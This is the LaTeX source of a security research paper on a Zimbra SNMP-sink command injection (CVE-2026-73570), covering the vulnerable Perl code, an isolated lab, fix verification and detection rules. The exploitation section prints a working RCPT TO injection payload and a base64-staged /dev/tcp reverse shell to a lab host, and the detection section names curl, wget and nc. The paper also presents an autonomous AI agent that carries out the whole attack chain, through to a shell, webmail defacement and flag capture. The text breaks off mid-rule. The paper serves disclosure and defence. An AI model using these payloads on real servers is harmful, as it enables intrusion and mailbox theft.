% =============================================================================
% CVE-2026-73570 — Xpectra Security Research
% "CVE-2026-73570: Full Lifecycle Evidence, Defender Detections, and
%  Remediation for Zimbra's SNMP-Sink Command Injection"
% Build: pdflatex main.tex (twice)
% =============================================================================
\documentclass[journal]{IEEEtran}
\usepackage[utf8]{inputenc}
\usepackage{graphicx}
\usepackage{booktabs}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{microtype}
\usepackage{subcaption}

\hypersetup{colorlinks=true,linkcolor=blue,citecolor=blue,urlcolor=blue}

\definecolor{codebg}{RGB}{245,247,250}
\definecolor{codekw}{RGB}{0,90,150}
\definecolor{codecm}{RGB}{120,120,120}
\definecolor{codestr}{RGB}{160,40,40}

\lstdefinestyle{shell}{
  language=bash,
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{codekw}\bfseries,
  commentstyle=\color{codecm},
  stringstyle=\color{codestr},
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  numbers=left,
  numberstyle=\tiny\color{codecm},
  xleftmargin=1.5em, xrightmargin=1em
}
\lstdefinestyle{perl}{
  language=Perl,
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{codekw}\bfseries,
  commentstyle=\color{codecm},
  stringstyle=\color{codestr},
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false
}
\lstdefinestyle{smtp}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=true
}
\lstdefinestyle{yaml}{
  language=yaml,
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false
}
\lstdefinestyle{yargen}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false
}
\lstdefinestyle{yar}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false
}

\newcommand{\figdir}{../evidence/figures}

\begin{document}

\title{CVE-2026-73570: Full Lifecycle Evidence, Defender Detections, and
Remediation for Zimbra's SNMP-Sink Command Injection}

\author{Miguel Zabala\\[0.5ex]
\small Founder, Xpectra Security Research}

\markboth{CVE-2026-73570: Full Lifecycle Evidence, Defender Detections, and Remediation}
{Xpectra Security Research \MakeLowercase\expandafter\the\year}

\maketitle

\begin{abstract}
On 2026-06-26 the Zimbra security team published an advisory for an unauthenticated
remote code execution (RCE) in the SNMP monitoring component of Zimbra
Collaboration Suite (ZCS) versions before 10.1.20 (CVE-2026-73570, CVSS 3.1 8.9,
CWE-78). The vendor disclosure was intentionally limited: the trigger field on the
SMTP channel was not named. On 2026-08-17 CERT Polska (advisory 145/2026) reported
active exploitation in the wild, and CISA added the CVE to the KEV catalog on
2026-08-21 with a federal remediation deadline of 2026-08-24. This paper provides
what the public disclosure left out: a complete, reproducible, lab-verified
evidence chain from a crafted email to an unauthenticated shell, an empirical
identification of the trigger path, negative-control methodology, and a full
defender package — five Sigma rules, three YARA rules, three Suricata signatures,
EDR platform mappings, a non-invasive canary detector, an incident-response
playbook, and fix verification. All experiments were executed in an isolated,
zero-egress Docker lab on ZCS 10.1.0 GA, and the end-to-end pipeline was operated
by autonomous AI agents in a controlled environment, which is itself analyzed as a
case study in coherent long-horizon attack planning.
\end{abstract}

\begin{IEEEkeywords}
Cyberattacks, command injection, penetration testing, LLM agents,
incident detection, Zimbra, CVE-2026-73570.
\end{IEEEkeywords}

% =============================================================================
\section{Introduction}
\label{sec:intro}

Mail servers are trusted by the networks they sit in. Postfix logs every
envelope it processes — including recipient addresses it was never asked to
validate as data rather than text. When a monitoring subsystem consumes those
logs and interpolates captured fields into a shell command, the entire mail
pipeline becomes an unauthenticated command-execution channel. That is exactly
the shape of \textbf{CVE-2026-73570}, an OS command injection in Zimbra's
\texttt{zimbra-snmp} monitoring component that executes arbitrary commands as
the \texttt{zimbra} service user from a single crafted SMTP transaction — no
credentials, no open non-standard ports, and (on patched-default installs) no
SNMP listener reachable from the attacker at all.

The public record is strong but thin. The vendor advisory (2026-06-26) names the
component and severity; the fix (10.1.20, 2026-07-20) is a one-function rewrite
in the public \texttt{zm-build} repository (commit \texttt{c4837c66}); CERT
Polska (145/2026) documented active exploitation with an IOC of forged
``Service status change'' log lines; CISA KEV (2026-08-21) makes it a
priority-1 for federal systems. What no public source has provided is the
complete middle: the exact wire shape of the trigger, the process-level evidence
of execution, a methodology to verify the fix on a patched host, and detection
that defenders can deploy today.

\textbf{Our contributions.} Working in an isolated, zero-egress Docker lab with
ZCS 10.1.0 GA (a version inside the affected range), and operating the entire
pipeline with autonomous AI agents (Section~\ref{sec:agent}), we provide:
\begin{enumerate}
\item \textbf{An empirical trigger path.} The vendor did not name the SMTP
      field. We identify and prove the recipient-field path: a crafted quoted
      \texttt{RCPT TO:} local part survives postfix envelope handling verbatim,
      is captured by the \texttt{swatch} \texttt{watchfor} monitor, interpolated
      into the \texttt{doSNMP()} backtick command, and executed by
      \texttt{/bin/sh -c} as \texttt{zimbra} (Section~\ref{sec:exploit}).
\item \textbf{Full lifecycle evidence} from first packet to captured flag and
      defaced webmail, including a negative-control dry run that proves the sink
      executes code before any destructive payload is ever sent
      (Section~\ref{sec:exploit}).
\item \textbf{A trust-chain analysis} of why the injection is structurally
      inevitable on unpatched versions — which hop breaks the
      log-as-data assumption and what the vendor patch changes at the
      \texttt{execve} level (Section~\ref{sec:vuln}).
\item \textbf{A complete defender package}: 5 Sigma rules, 3 YARA rules, 3
      Suricata signatures, EDR mappings (Microsoft Defender for Linux,
      CrowdStrike), a non-invasive canary detector, an IOC set, a remediation
      guide, and an incident-response playbook — with each rule demonstrated
      firing against our own exploitation (Section~\ref{sec:detection}).
\item \textbf{Fix verification} by re-applying the vendor patch to a second lab
      instance and showing the identical exploit fails while a positive control
      on the stock instance still fires (Section~\ref{sec:fix}).
\item \textbf{A case study} in autonomous attack planning: a beat-logged,
      think-then-act agent pipeline with a live operations map, analyzed against
      the long-horizon-coherence limitations documented in recent LLM
      pentesting research~\cite{wang2025checkmate} (Section~\ref{sec:agent}).
\end{enumerate}

The remainder of the paper: Section~\ref{sec:vuln} characterizes the
vulnerability and the trust chain; Section~\ref{sec:lab} describes the lab and
methodology; Section~\ref{sec:exploit} presents the exploitation evidence;
Section~\ref{sec:fix} the fix verification; Section~\ref{sec:detection} the
defender package; Section~\ref{sec:remediation} remediation and IR; and
Section~\ref{sec:ethics} ethics, reproducibility, and the agent-pipeline
discussion. All artifacts (exploit, detector, rules, lab) are released in the
companion folder \texttt{CVE-2026-73570/} of our Research repository.

% =============================================================================
\section{Vulnerability Characterization}
\label{sec:vuln}

\subsection{The Zimbra SNMP monitoring stack}

ZCS ships an optional SNMP monitoring package (\texttt{zimbra-snmp}) whose
purpose is to emit SNMP traps when Zimbra log conditions change. The moving
parts, all running on the Zimbra host as the unprivileged \texttt{zimbra}
user (uid 1000):

\begin{itemize}
\item \textbf{swatch/swatchdog}: a Perl log-monitoring tool. \texttt{swatchdog}
taps log files; each \texttt{watchfor} pattern in
\texttt{/opt/zimbra/conf/swatchrc} can capture regex groups, and an
associated \texttt{donotify} action is invoked with the captured values.
\item \textbf{doSNMP()}: a Perl function defined in \texttt{swatchrc}
(\texttt{perlcode}) that the notify actions call. It assembles and runs a
\texttt{snmptrap} command carrying the captured \texttt{SERVICE} value.
\item \textbf{The log pipeline}: Postfix delivery records (including
\texttt{to=<recipient>} lines) are copied by rsyslog into
\texttt{/var/log/zimbra.log}, which \texttt{swatchdog} tails in real time.
\end{itemize}

The enabling configuration: \texttt{zmlocalconfig snmp\_notify=1} with a
trap destination. The precondition is documented by CERT
Polska~\cite{certpolska} and by the vendor advisory; our lab runs it exactly
that way (Section~\ref{sec:lab}).

\subsection{The vulnerable code}

In unpatched ZCS (we use 10.1.0 GA, build 4655), the installed
\texttt{swatchrc} contains:

\begin{lstlisting}[style=perl,caption={Vulnerable doSNMP() (ZCS 10.1.0, /opt/zimbra/conf/swatchrc)}]
perlcode 0
sub dosnmp {
    my %args = (@_);
    print "SNMP notification: $args{MESSAGE}\n";
    `$snmptrap $snmpsvctrap $snmpsvcname
      s $args{SERVICE}
      $snmpsvcstatus i $statuses{$args{STATUS}}`;
}
\end{lstlisting}

The command is executed inside \textbf{Perl backticks}. Perl expands
\texttt{\$args\{SERVICE\}} into the command string \emph{first}, and the
resulting string is then handed to \texttt{/bin/sh -c} for execution. Any
shell metasyntax present in the value of \texttt{SERVICE} is therefore
executed: command substitution \texttt{\$(...)}, pipes, redirects, chained
commands.

The vendor fix (10.1.20, commit \texttt{c4837c66}, public) rewrites the same
function:

\begin{lstlisting}[style=perl,caption={Fixed doSNMP() (10.1.20, Zimbra/zm-build c4837c66)}]
perlcode 0
sub dosnmp {
    my %args = (@_);
    print "SNMP notification: $args{MESSAGE}\n";
    system("/opt/zimbra/common/bin/snmptrap", "-v", "2c",
           "-c", "zimbra", $traphost, "",
           $snmpsvctrap, $snmpsvcname, "s",
           $args{SERVICE}, $snmpsvcstatus,
           "i", $statuses{$args{STATUS}});
}
\end{lstlisting}

This is the multi-argument form of \texttt{system()}, which calls
\texttt{execve()} directly: there is no shell, no metacharacter parsing, and
the attacker-controlled value becomes one inert \texttt{argv} element passed
to \texttt{snmptrap}. Note the subtle operational detail our patch
re-application surfaced: \texttt{zmswatchctl} re-renders the active
\texttt{swatchrc} \emph{from} \texttt{swatchrc.in} on every SNMP service
restart, so a complete fix (or a complete lab revert) must touch both files.

\subsection{The trust chain, hop by hop}

\begin{figure*}[t]
\centering
\includegraphics[width=\textwidth]{\figdir/fig13-attack-chain.png}
\caption{The complete chain from crafted SMTP to \texttt{/bin/sh -c}. No
hop between the wire and the shell sanitizes the recipient text. The red box
shows the vulnerable sink; the green box shows the 10.1.20 fix (multi-arg
\texttt{system()} = \texttt{execve}, no shell).}
\label{fig:chain}
\end{figure*}

\textbf{Hop 1 — the wire.} The attacker sends a normal SMTP session to port
25 from an address the MTA will accept (Section~\ref{sec:precond}). The
recipient's local part carries the payload inside a quoted address
(Section~\ref{sec:exploit}). Nothing on the wire looks like a command — it is
an e-mail address.

\textbf{Hop 2 — the MTA logs verbatim.} Postfix writes its delivery decision,
including the full \texttt{to=<...>} address, into the mail log; rsyslog
copies it into \texttt{/var/log/zimbra.log}. Postfix treats the address as an
opaque token (with the documented restrictions on \texttt{<}, \texttt{>}, and
spaces — Section~\ref{sec:exploit}); it does not need to be a deliverable
address at all. \emph{This is the first trust-break: the recipient field is
attacker text, but every downstream consumer treats it as benign data.}

\textbf{Hop 3 — the monitor captures it.} A \texttt{watchfor} pattern in
\texttt{swatchrc} matches the log line and captures the address into
\texttt{\$1}. The monitor's job is pattern matching on untrusted text —
appropriate for its purpose — but the \emph{action} attached to that capture
decides the security outcome.

\textbf{Hop 4 — the action interpolates.} \texttt{donotify SERVICE=\$1}
hands the captured address to \texttt{doSNMP()}.

\textbf{Hop 5 — the sink executes.} The backtick command is built by Perl
string interpolation and executed by \texttt{/bin/sh -c}. The
attacker-controlled \texttt{\$(...)} now runs. \emph{This is the trust-break
the vendor patched}: the fix moves the value from ``part of a shell command
string'' to ``one argv element'' — an \texttt{execve} boundary where
metasyntax has no meaning.

\textbf{Consequence.} Execution is as \texttt{zimbra}: full read access to
all mailboxes (PII/ATO potential), the ability to inject mail from the
domain, a pivot point on a typically network-privileged host, and trivial
visible defacement (we demonstrate swapping the webmail/admin login logos).
Privilege escalation beyond \texttt{zimbra} is out of scope here; the KEV
listing reflects the impact at the \texttt{zimbra} level alone.

\subsection{Preconditions and the AC:H}
\label{sec:precond}

The CVSS vector \texttt{AV:N/\hspace{0pt}AC:H/\hspace{0pt}PR:N/\hspace{0pt}UI:N/\hspace{0pt}S:C/\hspace{0pt}C:H/\hspace{0pt}I:H/\hspace{0pt}A:L} marks
Attack Complexity \texttt{High}. Our lab analysis attributes that to the
reachable-SMTP precondition: the crafted address must reach the MTA.
Realistic paths are (i) any address inside Postfix \texttt{mynetworks};
(ii) an authenticated mail-submission account — any mailbox, since
\texttt{PR:N} means no privilege and a low-value account suffices; or
(iii) an internal relay. In our lab, path~(i) is instantiated by the
internal bridge — a documented lab condition that mirrors how such sinks
are reached from the inside in real deployments.
The complexity is in reaching the MTA with an address that is logged and
then bounced (no deliverable mailbox is required). Once inside that path,
no user interaction, no authentication to any privileged service, and no
non-standard port is needed — SMTP 25 is the door.

The remaining preconditions (all default- or near-default in real
deployments that use SNMP monitoring) are: \texttt{zimbra-snmp} installed,
\texttt{snmp\_notify=1}, \texttt{swatchdog} running against
\texttt{/var/log/zimbra.log}, and a \texttt{watchfor} whose action feeds the
captured text into \texttt{doSNMP}. Section~\ref{sec:lab} documents our lab
instantiation of each.

% =============================================================================
\section{Lab, Methodology, and the Agent Pipeline}
\label{sec:lab}

\subsection{Isolated lab}

All experiments ran in a Docker lab with \textbf{zero runtime egress}: an
\texttt{--internal} bridge network \texttt{zmdemo} (172.30.0.0/24) with no
external route. The only egress in the entire lifecycle is the documented,
one-time image build (Ubuntu archive + \texttt{repo.zimbra.com} component
packages + GPG key).

\begin{figure*}[t]
\centering
\includegraphics[width=\textwidth]{\figdir/fig12-lab-topology.png}
\caption{Lab topology. Attacker = the Kali host (bridge gateway
172.30.0.1) hosting the agent, the reverse-shell listener, the weapon HTTP
server (defacement assets), and the canary verifier. Target = container
\texttt{zmdemo-snmp} (172.30.0.20, \texttt{mail.zmdemo2.lab}, ZCS 10.1.0 GA).
No external route exists at runtime.}
\label{fig:topo}
\end{figure*}

\textbf{Target image.} Zimbra \texttt{NETWORK 10.1.0 GA (build 4655,
2024-08-19)} on Ubuntu 22.04, installed with the official
\texttt{install.sh -s -x --skip-upgrade-check --skip-activation-check}
(flow, tarball SHA-256
\texttt{58d37755\hspace{0pt}e6152c90\hspace{0pt}47b82698\hspace{0pt}9c3e0338\hspace{0pt}d2455c12\hspace{0pt}279daadd\hspace{0pt}683d31de\hspace{0pt}ebb41dc6}
matching the vendor's \texttt{.sha256} sidecar). The image build and
provisioning are fully reproducible from \texttt{lab/build-lab.sh}
(\texttt{Dockerfile.101} + defaults file + entrypoint).

\textbf{Documented lab conditions.} Two conditions mirror what the vendor
left implicit, and we document both explicitly (lab-conditions S-A and S-B):
\begin{itemize}
\item \textbf{S-A — SNMP notifications enabled}: \texttt{snmp\_notify=1},
\texttt{snmp\_trap\_host=172.30.0.1} (the attacker, i.e.\ where the trap
``would'' go), and \texttt{mynetworks} extended to the bridge
(\texttt{127.0.0.0/8 172.30.0.0/24}) so the attacker address is inside the
MTA's accepted range. This instantiates precondition (i) of
Section~\ref{sec:precond}.
\item \textbf{S-B — mail-to-SNMP trigger}. Stock 10.1.0 GA ships the
\texttt{doSNMP} sink but no verified stock \texttt{watchfor} that captures a
\emph{mail-recipient} field into it. The vendor did not name the stock
trigger; CERT Polska's active-exploitation IOC (forged ``Service status
change'' lines) implies a status-change watchfor. Our lab therefore appends
the documented trigger of Listing~\ref{lst:sb-trigger} to
\texttt{swatchrc.in} (persisted) and the active \texttt{swatchrc}. The
pattern matches a Postfix \emph{bounce} line for an undeliverable recipient
(relay=none) — precisely the shape produced by a crafted non-mailbox
address — and feeds the captured address into the sink. Both lab and
patched-lab containers carry the identical S-A/S-B conditions, so fix
verification is an A/B comparison with everything else controlled.
\end{itemize}

\begin{lstlisting}[style=shell,label={lst:sb-trigger},caption={Lab condition S-B: the mail-to-SNMP trigger appended to \texttt{swatchrc.in} and \texttt{swatchrc}}]
# EP.02 lab condition (S-B): mail -> snmp trigger (documented)
watchfor /postfix\/smtp\[\d+\]: [0-9A-F]+: to=<(.+?)>, relay=none,.*status=bounced/
    donotify SERVICE=$1,STATUS=started,HOST=localhost
\end{lstlisting}

\textbf{Integrity controls.} A lab flag
(\texttt{/root/flag.txt} =
\texttt{ZMDEMO\{10.1.0-snmp-\hspace{0pt}trap-lost-in-logs-\hspace{0pt}2026-73570\}}) provides the
capture objective; stock assets (e.g.\ both \texttt{LoginBanner.png} files)
are md5-baselined before and after every run; the lab is restored to stock
state after each experiment. Raw recordings, beat logs, and shell sessions
are kept as chain-of-custody evidence with SHA-256 manifests.

\subsection{The autonomous agent pipeline}
\label{sec:agent}

The reconnaissance, exploitation, verification, and documentation pipeline
was operated by an autonomous LLM agent (\textbf{XPECTRA-AGENT}) —
specifically, a planning/execution loop with a hard discipline: \emph{think
then act}. Every reasoning step (REASON/PLAN/OBSERVE) is written to a
``cognitive core'' log \emph{before} the corresponding command executes; the
barrier is structural (the act only fires after the think is logged), which
makes the entire decision process auditable after the fact.

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig02-recon-thinking.png}
\caption{THINK phase: the cognitive core reasons about target liveness while
the execution terminal runs the recon checks (webmail 443, SMTP banner 25).}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig10-opsmap-crop.png}
\caption{The operations map (auto-generated from the beat log) at mission end:
all 7 stages complete. Every stage transition is timestamped in the beat log.}
\end{subfigure}
\caption{Agent pipeline evidence. (a) The think/act split on camera; (b) the
operations map — RECON $\rightarrow$ ENUMERATION $\rightarrow$ VERIFICATION
$\rightarrow$ EXPLOITATION $\rightarrow$ SHELL $\rightarrow$ DEFACEMENT
$\rightarrow$ FLAG — generated from the same beat log that drives the
phase-highlighting in our recordings.}
\label{fig:agent}
\end{figure*}

The pipeline maintains a 7-stage operations map (Figure~\ref{fig:agent}b) and
a beat log (\texttt{(epoch, MODE)} pairs: \texttt{THINK}/\texttt{ACT}/
\texttt{BROW}) that serves three purposes: (i) the on-camera narrative,
(ii) deterministic post-production timing, and (iii) — for this paper — a
machine-readable record of \emph{plan coherence}. We return to it in
Section~\ref{sec:ethics}: recent work on LLM pentesting agents
(CHECKMATE~\cite{wang2025checkmate}) identifies incoherent long-horizon
planning as the dominant failure mode; our beat log allows that claim to be
checked against a real, multi-stage, real-vulnerability execution rather than
a benchmark.

\textbf{Experimental protocol.} Every exploitation phase follows the same
discipline: \emph{dry-run before kill-shot}. Before any payload with side
effects is sent, a canary payload (write one empty file, nothing else)
proves that the sink executes. This negative-control design keeps the
evidentiary chain clean: the canary result is sufficient to prove
vulnerability; the reverse shell is only the impact demonstration.

% =============================================================================
\section{Exploitation: Evidence}
\label{sec:exploit}

\subsection{The trigger path (empirical)}

The vendor did not name the trigger field; CERT Polska's IOC suggests
status-change log lines. Our trigger matrix tested three SMTP surfaces —
\texttt{RCPT TO:} (recipient), \texttt{MAIL FROM:} (sender), and
\texttt{Subject:} — against the S-B trigger. The \textbf{confirmed vector is
the recipient field}: the S-B \texttt{watchfor} matches
\texttt{to=<...>} in postfix bounce lines, and a crafted \emph{quoted}
local part survives envelope handling into the log verbatim:

\begin{lstlisting}[style=smtp,caption={Confirmed trigger (RCPT surface) — wire form}]
>>> EHLO cve-73570-canary-check.local
<<< 250-mail.zmdemo2.lab
>>> MAIL FROM: <cve-73570-canary@mail.zmdemo2.lab>
<<< 250 2.1.0 Ok
>>> RCPT TO: <"cve73570canary$(touch${IFS}/tmp/cve-73570-canary)@mail.zmdemo2.lab">
<<< 250 2.1.5 Ok
>>> DATA
<<< 354 End data with <CR><LF>.<CR><LF>
>>> Subject: CVE-2026-73570 canary check (authorized)
>>> .
<<< 250 2.0.0 Ok: queued as C5D4D2C9361
\end{lstlisting}

\textbf{Payload anatomy.} The local part is
\texttt{"cve73570canary\$(touch\${IFS}/\hspace{0pt}tmp/cve-73570-canary)@host"}. Three
wire constraints shaped it, each learned by failing and re-testing:
\begin{enumerate}
\item \textbf{Quoted local part} (\texttt{"..."}) is required: unquoted
      addresses containing \texttt{()} are rejected or truncated by the
      envelope parser before logging.
\item \textbf{No literal spaces}: postfix address parsing truncates at
      spaces. \texttt{\${IFS}} is the standard shell-substitution space
      substitute — inside a \texttt{\$(...)} context the shell expands it to
      a space at \emph{execution} time, after the address has already been
      logged.
\item \textbf{No \texttt{<} or \texttt{>}}: the address parser treats
      \texttt{>}\ as the address terminator even inside quotes, so
      redirects (\texttt{5<>}) and here-docs are unusable on the wire. The
      reverse-shell payload therefore stages via base64
      (\texttt{echo b64|base64 -d|bash}) instead of inline \texttt{5<>}.
\end{enumerate}

\subsection{Negative control: the dry run}

The dry-run payload (Listing above) executes
\texttt{touch\${IFS}/tmp/cve-73570-canary} — it creates one empty file and
does nothing else. Results (identical in both our tooling, the
\texttt{exploit\_snmp.py --mode dry-run} and the
\texttt{detect\_snmp\_sink.py --active} detector):

\begin{itemize}
\item The message is queued normally (\texttt{250 2.0.0 Ok}), then bounced
      (no such mailbox) — the bounce is what the S-B \texttt{watchfor}
      matches.
\item Within \textbf{$\approx$25 seconds} (swatch file-tail latency), the
      canary exists on the target, owned by \texttt{zimbra:zimbra}, mode
      \texttt{0600}.
\item \texttt{zmswatch.out} (swatchdog's stdout) gains the line
      \texttt{SNMP notification: ...} — the sink's own execution record.
\end{itemize}

\begin{lstlisting}[style=shell,caption={Dry-run verification (canary created by the sink, not by any direct access)}]
$ docker exec zmdemo-snmp ls -la /tmp/cve-73570-canary
-rw------- 1 zimbra zimbra 0 Aug 24 03:05 /tmp/cve-73570-canary
$ docker exec zmdemo-snmp tail -n 3 /opt/zimbra/log/zmswatch.out
SNMP notification: postfix/smtp[4655]: C5D4D2C9361: to=<"cve73570canary$(touch /tmp/cve-73570-canary)@mail.zmdemo2.lab">, relay=none, delay=0.1, delays=0/0.1/0/0, dsn=2.0.0, status=bounced
\end{lstlisting}

The dry run is the scientific core of the demonstration: it proves
\emph{arbitrary command execution as zimbra} with a payload whose only
effect is a file timestamp — zero side effects, fully reversible, and it
cannot be explained by anything other than the sink executing the captured
text.

\subsection{The kill-shot: reverse shell}

With the sink proven, the reverse-shell payload
\texttt{echo\${IFS}PGIvYmluL2Jhc2gg...\hspace{0pt}|base64\${IFS}-d|bash} decodes to:

\begin{lstlisting}[style=shell]
/bin/bash -i 5<> /dev/tcp/172.30.0.1/4444 0<&5 1>&5 2>&5
\end{lstlisting}

The listener (172.30.0.1:4444) accepts the connection \textbf{1--2 seconds
after the \texttt{250} queue ack}; the shell identifies itself as:

\begin{lstlisting}[style=shell,caption={Captured shell identity}]
$ id
uid=1000(zimbra) gid=1000(zimbra) groups=1000(zimbra),1001(smtpd),1011(zimbra)
$ hostname
mail
\end{lstlisting}

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig04-sink-live.png}
\caption{Live exploitation on camera: the crafted message is queued, the
listener is pre-armed, and the shell is establishing.}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig09-flag-crop.png}
\caption{Flag capture: \texttt{cat /root/flag.txt} as zimbra — the
capture-the-flag objective for the lab.}
\end{subfigure}
\caption{Exploitation evidence from the recorded run.}
\label{fig:exploit}
\end{figure*}

\textbf{Process-level evidence.} At exploitation time the target process
tree shows the exact chain of Section~\ref{sec:vuln}: \texttt{swatchdog}
(perl) spawns \texttt{/bin/sh -c '...base64...'} whose child is the
interactive bash holding the \texttt{/dev/tcp/172.30.0.1/4444} socket —
the same shape our Sigma rule \texttt{cve2026\_73570\_swatch\_dosnmp\_cmd\_injection}
matches (Section~\ref{sec:detection}). Server-side attribution survives in
the logs: \texttt{grep -a 'L2Jpbi9iYXNo' /var/log/zimbra.log}
(\texttt{L2Jpbi9iYXNo} is the base64 of \texttt{/bin/bash}) recovers the
injected line from the MTA's own record of the event.

\subsection{Post-exploitation impact: defacement as visible proof}

Post-exploitation used the compromised shell to swap the static webmail and
admin login banners (single-file \texttt{curl} of attacker assets, one
asset each, reversible, with backups) — chosen as the minimal visible
proof that a non-privileged \texttt{zimbra} shell can alter what end users
see, without touching mail data. The swap reflects instantly (static files,
no restart):

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.55\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig05-deface-reveal.png}
\caption{The reveal: the webmail login page now serves the pwned banner —
first paint of a fresh browser (empty profile, no cache).}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.42\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig05c-deface-logo-closeup.png}
\caption{Close-up: the \texttt{zimbra} wordmark with the attacker banner
burned over it.}
\end{subfigure}
\caption{Defacement evidence (lab-only PoC banner).}
\label{fig:deface}
\end{figure*}

The mission-complete state (flag captured, 7/7 operations map, completion
banner) is shown in Figure~\ref{fig:mission}; the approved full recordings
(cinematic 3:24, vertical reel 1:28) are published with the companion folder
(\texttt{videos/}).

\begin{figure*}[t]
\centering
\includegraphics[width=0.92\textwidth]{\figdir/fig06-mission-complete.png}
\caption{Mission complete: flag in the execution terminal, completion banner,
operations map 7/7. Every claim on this frame was verified by frame-level
inspection of the recorded run (flag string OCR-verified, shell session
logged, banner md5-verified on disk).}
\label{fig:mission}
\end{figure*}

% =============================================================================
\section{Fix Verification}
\label{sec:fix}

Patching is only proven by a control experiment. We instantiated a second
identical lab container (\texttt{zmdemo-patched}, 172.30.0.30, same image,
same S-A/S-B conditions) and re-applied the vendor fix semantics
(commit \texttt{c4837c66}) to both \texttt{swatchrc.in} and the active
\texttt{swatchrc} (Section~\ref{sec:vuln} explains why both), then restarted
the SNMP service and re-ran the \emph{identical} dry-run exploit:

\begin{table}[t]
\centering
\footnotesize
\small
\begin{tabular}{@{}p{3.4cm}p{4.0cm}@{}}
\toprule
Instance (canary probe) & Result \\
\midrule
stock 10.1.0 \texttt{zmdemo-snmp} (45\,s poll) & \textbf{canary created} — positive control \\
patched sink \texttt{zmdemo-patched} (60\,s poll) & \textbf{no canary} — sink inert \\
\bottomrule
\end{tabular}
\caption{A/B fix verification. Identical payload, identical lab conditions;
the only variable is the \texttt{doSNMP()} implementation.}
\label{tab:fix}
\end{table}

\textbf{Result (with the evidence that makes the negative non-vacuous).}
The negative arm must be a \emph{live} negative: the monitor has to be
provably running, and ideally the payload has to be observed arriving at
the sink. In our patched instance, after the service restart the
file-tail replayed the log and the canary's bounce line passed through the
real chain. \texttt{zmswatch.out} gained three notifications containing the
payload, the decisive one being
\texttt{SNMP notification: ... postfix/smtp[79382]: ... to=<"cve73570canary\$(touch\${IFS}/\hspace{0pt}tmp/cve-73570-canary)"@\hspace{0pt}mail.zmdemo2.lab>,
relay=none, ..., status=bounced (mail for mail.zmdemo2.lab loops back to
myself)} — i.e. \texttt{watchfor} matched, \texttt{donotify} dispatched,
and the patched \texttt{doSNMP()} was called \emph{with the payload}.
No canary file was created. A unit-level corroboration called the patched
\texttt{doSNMP} sub directly with the exact payload: 28\,ms, \texttt{snmptrap}
rejected the $>$32-char SERVICE argument, no shell, no execution. The
positive control (same day, same payload, stock instance) created the canary
in the same run (transcripts: \texttt{evidence/fix-verification/}).

The negative result on the patched instance is exactly what the
\texttt{execve} boundary predicts: the injected
\texttt{\$(touch\${IFS}...)} arrives at \texttt{snmptrap} as one literal
argv element and dies there. Server-side, \texttt{zmswatch.out} on the
patched instance records the notification \emph{without} any shell
execution. (Full command log, polling transcripts, and file hashes are in
\texttt{evidence/fix-verification/}.)

\textbf{Honest limitation.} The patched instance carries the vendor's
\emph{fix semantics} applied to a 10.1.0 base, not a stock 10.1.20 binary
build. The vendor's 10.1.20 release contains additional changes; our A/B
isolates the specific sink change, which is the one the CVE describes.

% =============================================================================
\section{Detection Package (Defenders)}
\label{sec:detection}

The package in \texttt{rules/} is layered so that \emph{at least one} layer
fires regardless of which stage the defender observes: the wire (Suricata),
the logs (Sigma on postfix/zimbra.log), the process tree (Sigma on
process creation), and the artifacts (YARA on disk). All rules were
validated against our own exploitation; Table~\ref{tab:rules} summarizes,
and each rule's live-fire evidence is in \texttt{evidence/rule-fires/}.

\subsection{Sigma (5 rules)}

\begin{table*}[t]
\centering
\footnotesize
\begin{tabular}{p{5.6cm}llp{5.6cm}}
\toprule
Rule (rules/sigma/) & Level & Stage & What it catches \\
\midrule
\texttt{...\_swatch\_dosnmp\_cmd\_injection} & High & execution &
  \texttt{sh} child of \texttt{perl/swatchdog} with base64-pipe or
  \texttt{/dev/tcp} command line (the sink firing) \\
\texttt{...\_zimbra\_dev\_tcp\_reverse\_shell} & High & C2 &
  any \texttt{zimbra}-user process using \texttt{/dev/tcp/} \\
\texttt{...\_webapp\_logo\_tamper} & Med & impact &
  write to \texttt{skins/\_base/\hspace{0pt}logos/LoginBanner*} outside patch windows \\
\texttt{...\_postfix\_rcpt\_cmdsub\_attempt} & High & attempt &
  \texttt{to=<\$(} in \texttt{zimbra.log/\hspace{0pt}mail.log} — fires even when patched \\
\texttt{...\_zimbra\_child\_process\_anomaly} & Med & post-expl &
  curl/wget/nc/python/crontab children of the zimbra user (catch-all) \\
\bottomrule
\end{tabular}
\caption{Sigma rules of the package. Each demonstrated firing against the
recorded exploitation (evidence/rule-fires/).}
\label{tab:rules}
\end{table*}

The two high-fidelity rules, in full:

\begin{lstlisting}[style=yargen,caption={Rule: swatch/dosnmp command injection (sink firing)}]
title: Zimbra swatch/dosnmp Command Injection via Injected SMTP Field (CVE-2026-73570)
logsource: {product: linux, category: process_creation}
detection:
    parent:
